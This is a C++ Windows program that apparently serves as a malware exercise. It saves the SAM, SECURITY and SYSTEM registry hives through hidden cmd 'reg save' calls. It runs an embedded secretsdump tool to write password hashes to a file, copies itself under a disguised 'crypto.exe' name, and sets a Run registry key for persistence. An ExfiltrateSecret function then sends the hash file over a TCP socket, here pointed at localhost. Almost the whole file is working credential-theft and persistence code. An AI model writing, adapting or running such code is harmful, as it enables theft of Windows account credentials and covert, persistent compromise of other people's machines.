// main.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#define __STDC_WANT_LIB_EXT1__ 1

#include <direct.h>
#include <io.h>
#include <cstring>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <cstdlib>
#include <string>
#include <tchar.h>
#include "resource.h"
#include <fstream>
#include <atlstr.h>

// Link with ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")

#define HOST_NAME "localhost"
#define PORT_NUMBER "50000" // should fail because no server-side code is listening
#define FILE_NAME "hash.txt"
#define BUFFER_SIZE 512

using namespace std;


//Define messageboxA typedef
typedef int(_stdcall* Msg) (HWND, LPCSTR, LPCSTR, UINT);
//Define ShellExecuteA typedef
typedef HINSTANCE(_stdcall* Shell) (HWND,LPCSTR,LPCSTR,LPCSTR,LPCSTR,INT);
//Define GetModuleFileNameA
typedef DWORD (_stdcall* ModuleFile)(HMODULE,LPSTR,DWORD );
//Define CopyFile
typedef BOOL (_stdcall* Copying)(LPCTSTR,LPCTSTR,BOOL);


HINSTANCE LLibrary(LPCWSTR dllToLoad);
void DumpSam();
string XorEncoding(string input, char cipher);
void CopyExe();
void AddToRegistry(LPCTSTR data);
void ExtractResource();
string ReturnTempPath(string name);
BOOL ExecuteDump();
void ExfiltrateSecret();

int main(int argc, char* argv[])
{ 

	ExtractResource();
	DumpSam();
	ExecuteDump();
	CopyExe();
	ExfiltrateSecret();


	//Get handle to user32.dll
	HINSTANCE hDll = LLibrary(TEXT("User32.dll"));

	printf("Lib Loaded\n");
	Msg MsgBox = (Msg)GetProcAddress(hDll, "MessageBoxA");
	MsgBox(NULL, "Test", "test", 0);

	//Release the library
	FreeLibrary(hDll);
	
	return 0;
	
}

//Function to dump the three registries to file; sam, security and system
void DumpSam() {

	//Load shell32.dll
	HINSTANCE shellDll = LLibrary(TEXT("Shell32.dll"));
	Shell ShellExec = (Shell)GetProcAddress(shellDll, "ShellExecuteA");


	//Save the sam registry
	HINSTANCE samReg = ShellExec(NULL, "open", "cmd.exe", "/C reg save hklm\\sam %TEMP%\\sam.save ", NULL, SW_HIDE);

	//Check if value returned is greater than 32
	if (!((int)samReg > 32)) {
		printf("Error dumping sam registry.\n");
	}

	//Save the security registry
	HINSTANCE securityReg = ShellExec(NULL, "open", "cmd.exe", "/C reg save hklm\\security  %TEMP%\\security.save ", NULL, SW_HIDE);

	if (!((int)securityReg > 32)) {
		printf("Error dumping security registry.\n");
	}

	//Save the system registry
	HINSTANCE systemReg = ShellExec(NULL, "open", "cmd.exe", "/C reg save hklm\\system %TEMP%\\system.save ", NULL, SW_HIDE);

	if (!((int)systemReg > 32)) {
		printf("Error dumping system registry.\n");
	}
}

//Function to load library
HINSTANCE LLibrary(LPCWSTR dllToLoad) {

	HINSTANCE hDll = LoadLibrary(dllToLoad);

	if (hDll == NULL) {
		wprintf(L"Error getting handle to: %s\n", dllToLoad);
		exit(-1);
	}
	
	return hDll;
}

//Function to encode/decode text
string XorEncoding(string input, char cipher) {

	for (int i = 0; i < input.size(); i++)
	{
		input[i] = input[i] ^ cipher;
	}

	return input;
}

//Function to copy the current exe to Crypto folder
void CopyExe() {

	HINSTANCE kernelDll = LLibrary(TEXT("Kernel32.dll"));
	ModuleFile ModuleFileName = (ModuleFile)GetProcAddress(kernelDll, "GetModuleFileNameA");
	Copying CopyingFile = (Copying)GetProcAddress(kernelDll, "CopyFile");

	//TODO: Use GetProcAddress functions to call the functions

	wchar_t charArray[MAX_PATH];
	//Get the full path from the handle
	GetModuleFileName(NULL, charArray, MAX_PATH);
	//Copy the current exe to the Crypto folder, and overwrite if one exists
	LPCTSTR path = L"C:\\ProgramData\\Microsoft\\Crypto\\crypto.exe";
	CopyFile(charArray,path, FALSE);

	//Once the file is copied add the exe to registry
	AddToRegistry(path);
}

//Function to set value under the register key CurrentVersion\Run (enable autorun on startup)
void AddToRegistry(LPCTSTR data) {
	
	HKEY hKey;

	LPCTSTR value = L"crypto";
	
	//Open the CurrentVersion\Run key 
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
		//Write the value and data to the opened key
		LSTATUS ret = RegSetValueEx(hKey, L"crypto", 0, REG_SZ, (LPBYTE)data, _tcslen(data) *sizeof(TCHAR));
		if (ret == ERROR_SUCCESS)
		{
			printf("Registry key set.\n");
		}
		else
		{
			printf("Failed to set registry key.\n");
		}
		RegCloseKey(hKey);
	}
	else {
		printf("Failed to open registry key.\n");
	}
}

//Function to extract secretdump.exe out of resource
void ExtractResource() {

	//Get the handle to the current process
	HMODULE hModule = GetModuleHandle(NULL);
	//Find the secretdump.exe resource
	HRSRC ret = FindResource(hModule, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	//Load the resource
	HGLOBAL res = LoadResource(hModule, ret);
	//Get lock to resource
	LPVOID lock = LockResource(res);
	//Get the size of the exe
	DWORD size = SizeofResource(hModule, ret);

	string path = ReturnTempPath("dump.exe");

	//Open output stream to file
	std::ofstream outputFile(path.c_str(), std::ios::binary);
	//Write the resource file 
	outputFile.write((const char*)lock, size);
	//Close the dile
	outputFile.close();
}


//Function that will append the temp dir with the given filename
string ReturnTempPath(string name) {

	//Get the temp path for the computer
	CHAR czTempPath[MAX_PATH] = { 0 };
	GetTempPathA(MAX_PATH, czTempPath); // retrieving temp path

	string path = czTempPath;
	//The name of the new exe
	path += name;

	return path;
}


//Function that will execute the dump.exe(secretsdump.exe)
BOOL ExecuteDump() {

	//Get the path relative to temp directory
	string exePath = ReturnTempPath("dump.exe");
	string samPath = ReturnTempPath("sam.save");
	string securityPath = ReturnTempPath("security.save");
	string systemPath = ReturnTempPath("system.save");
	string filePath = ReturnTempPath("hash.txt");
	string finalPath = exePath + " -sam " + samPath + " -security " + securityPath + " -system " + systemPath + " LOCAL ";
	
	//Convert file and final path from string to tchar
	TCHAR sFilePath[MAX_PATH];
	_tcscpy_s(sFilePath, CA2T(filePath.c_str()));

	TCHAR sFinalPath[MAX_PATH];
	_tcscpy_s(sFinalPath, CA2T(finalPath.c_str()));

	//Initialise security attributes
	SECURITY_ATTRIBUTES sa;
	sa.nLength = MAX_PATH;
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;


	//Create a file and get handle
	HANDLE hFile = CreateFile(sFilePath, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, &sa, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Initialise variables
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	BOOL ret = FALSE;
	DWORD flags = CREATE_NO_WINDOW;

	// Write the blocks of memory to zero
	SecureZeroMemory(&pi, sizeof(pi));
	SecureZeroMemory(&si, sizeof(si));

	//Initialise the startupinfo struct
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags |= STARTF_USESTDHANDLES;
	si.hStdInput = NULL;
	si.hStdOutput = hFile;
	si.hStdError = hFile;

	//Create(run) the process
	ret = CreateProcess(NULL, sFinalPath, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi);

	//If success, quit the process after exit
	if (ret) {
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return 0;
	}
	return -1;
}

//Function to smuggle the dumped secrets to remote server
void ExfiltrateSecret() {

	//----------------------------------------------
	// declare variables

	WSADATA wsaData;
	struct addrinfo hints, * res;
	int stat, sockfd;
	FILE* fd;
	errno_t error;

	//buffer to read
	char buffer[BUFFER_SIZE];

	//----------------------------------------------
	// initialization

	// Initialize winsock
	stat = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (stat != NO_ERROR)
	{
		printf("WSAStartup failure: %d (No usable Winsock DLL)\n", stat);
		scanf_s(" ");
		// do alt action or exit
		exit(-1);
	}

	// Setup the hints address info structure
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET; // IPv4
	hints.ai_socktype = SOCK_STREAM; // TCP-based
	hints.ai_protocol = IPPROTO_TCP; // TCP protocol

	// Protocol-independent translation from an ANSI host name to IP address
	stat = 0;
	if ((stat = getaddrinfo(HOST_NAME, PORT_NUMBER, &hints, &res)) != 0)
	{
		printf("getaddrinfo failed: %s\n", gai_strerror(stat));
		// do alt action or exit
		WSACleanup();
		scanf_s(" ");
		exit(-1);
	}

	// Initialize socket
	sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
	if (sockfd == INVALID_SOCKET)
		printf("Failed to init socket : %d\n", WSAGetLastError());

	// Establish connection
	if (connect(sockfd, res->ai_addr, res->ai_addrlen) == SOCKET_ERROR)
	{
		printf("connection failed : %ld\n", WSAGetLastError());
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		exit(-1);
	}

	//----------------------------------------------
	// send file to server

	error = fopen_s(&fd, FILE_NAME, "r+");
	int bytes_read;
	if (error != 0)
	{
		printf("error opening file under ");

		// Get the current working directory:
		char* buf;
		if ((buf = _getcwd(NULL, 0)) != NULL)
		{
			printf("%s \n", buf);
			free(buf);
		}
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		fclose(fd);
		exit(-1);
	}
	else
	{
		while (!feof(fd))
		{
			if ((bytes_read = fread(&buffer, 1, BUFFER_SIZE, fd)) > 0)
				send(sockfd, buffer, bytes_read, 0);
			else
				break;
		}
	}

	stat = fclose(fd);
	if (stat != 0)
	{
		printf("Error closing file descriptor. \n");
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		exit(-1);
	}

	//----------------------------------------------
	// close up

	if (closesocket(sockfd) == SOCKET_ERROR)
	{
		printf("Socket cannot be closed : %d\n", WSAGetLastError());
		scanf_s(" ");
		// do alt action or exit
		WSACleanup();
		exit(-1);
	}

	freeaddrinfo(res);
	WSACleanup();
}
